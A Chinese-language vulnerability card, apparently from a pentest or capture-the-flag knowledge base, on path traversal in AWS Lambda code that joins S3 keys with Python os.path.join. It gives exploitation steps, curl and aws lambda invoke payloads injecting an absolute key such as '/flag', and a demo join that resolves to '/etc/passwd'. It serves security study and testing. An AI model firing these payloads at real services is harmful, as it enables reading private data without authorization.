---
id: S3-PATH-TRAVERSAL-OSPATH
title: S3 路径穿越 — Python os.path.join 绝对路径绕过
product: aws-s3
vendor: Amazon
severity: HIGH
tags: [path-traversal, s3, aws, python, rce-adjacent]
fingerprint: ["s3.amazonaws.com", "AmazonS3", "os.path.join", "template"]
---

## 漏洞描述

当 Lambda 函数使用 Python `os.path.join()` 拼接 S3 Key 路径时，如果用户输入以 `/` 开头（绝对路径），`os.path.join` 会丢弃前面所有路径前缀，导致攻击者可以读取 S3 Bucket 中的任意 Key。常见的 `..` 过滤无法阻止此攻击。

## 前置条件

- Lambda 使用 `os.path.join(prefix, user_input)` 构造 S3 Key
- 仅过滤 `..` 而未校验绝对路径
- 攻击者能控制 user_input 参数

## 利用步骤

1. 识别参数（如 `template`）被用于 S3 Key 拼接
2. 注入绝对路径：`template=/flag`
3. `os.path.join("templates", "/flag.txt")` → `/flag.txt`
4. Lambda 读取 S3 Bucket 中 Key 为 `/flag.txt` 的对象

## Payload

```bash
# 通过 API Gateway（可能需要 Content-Type 绕过）
curl -X POST API_URL -H "Content-Type: text/plain" \
  -d '{"template":"/flag","token":"valid-token","name":"test"}'

# 通过 Lambda 直接调用（如果 Principal:*）
aws lambda invoke --function-name FUNC_ARN \
  --payload '{"template":"/flag","name":"test"}' /tmp/out.json
cat /tmp/out.json
```

```python
# os.path.join 行为演示
import os.path
os.path.join("templates", "normal.txt")   # → "templates/normal.txt"
os.path.join("templates", "/flag.txt")    # → "/flag.txt"  ← 路径穿越！
os.path.join("uploads", "/etc/passwd")    # → "/etc/passwd"
```

## 验证方法

成功读取私有 S3 Bucket 中指定 Key 的内容（如 flag 文件）。
